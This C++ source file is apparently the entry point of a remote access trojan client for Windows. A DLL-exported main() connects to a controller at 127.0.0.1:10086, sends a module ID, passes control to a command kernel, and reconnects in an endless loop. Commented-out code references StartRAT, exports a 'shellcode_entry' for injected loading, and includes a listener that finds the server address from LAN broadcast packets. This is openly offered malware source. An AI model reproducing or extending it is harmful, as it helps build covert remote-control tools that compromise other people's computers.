#define _CRT_SECURE_NO_WARNINGS

#include "App.h"

////LAN ....
//static void get_ip(char * ip){
//	SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
//	SOCKADDR_IN addr = { 0 };
//	char buff[0x100] = { 0 };
//	addr.sin_addr.S_un.S_addr = INADDR_ANY;
//	addr.sin_family = AF_INET;
//	addr.sin_port = htons(55512);
//
//	if (bind(s, (SOCKADDR*)&addr, sizeof(addr))){
//		printf("get_ip - bind failed");
//		exit(-1);
//	}
//
//	while (1){
//
//		SOCKADDR_IN from_addr = { 0 };
//		int from_len = sizeof(from_addr);
//		memset(buff, 0, sizeof(buff));
//		recvfrom(s, buff, 0xFF, 0, (SOCKADDR*)&from_addr, &from_len);
//
//		if (!memcmp(buff, "BINSONG-", 8)){
//			break;
//		}
//		printf("recv invalid packet...\n");
//	}
//	strcpy(ip, 8 + (char*)buff);
//	printf("recv server address : %s \n", ip);
//}

//
//#ifdef _DEBUG
//int main(){
//	CIOCPClient::SocketInit();
//	App::StartRAT();
//	return 0;
//}
//#else
//
//int main(){
//	App theApp;
//}
//
//extern "C" __declspec(dllexport) void shellcode_entry(){
//	App theApp;
//}
//#endif


//CApp theApp;

#include "IOCP.h"
#include "Client.h"
#include "dbg.h"

extern "C" __declspec(dllexport)  int main()
{
	WSADATA wsadata;

	if (WSAStartup(MAKEWORD(2, 0), &wsadata))
	{
		dbg_log("WSAStartup failed with error : %d",WSAGetLastError());
		exit(1);
	}


	CIOCP * iocp = new CIOCP;
	iocp->Create();
	
	//
	HANDLE hEvent = CreateEvent(0, 0, 0, 0);

	CClient * client = new CClient;
	CKernel * kernel = new CKernel(client);

	while (1)
	{
		client->Create();
		client->Bind(0);

		iocp->AssociateSock(client);

		client->Connect("127.0.0.1", 10086, NULL, hEvent);
		WaitForSingleObject(hEvent, INFINITE);

		if (client->IsConnected())
		{
			UINT32 ID = kernel->GetModuleID();
			client->Send((BYTE*)&ID, sizeof(ID));
			kernel->OnOpen();
			client->Run();
			kernel->Wait();
			dbg_log("connection close");
		}
		client->Close();
		Sleep(1000);
	}
	return 0;
}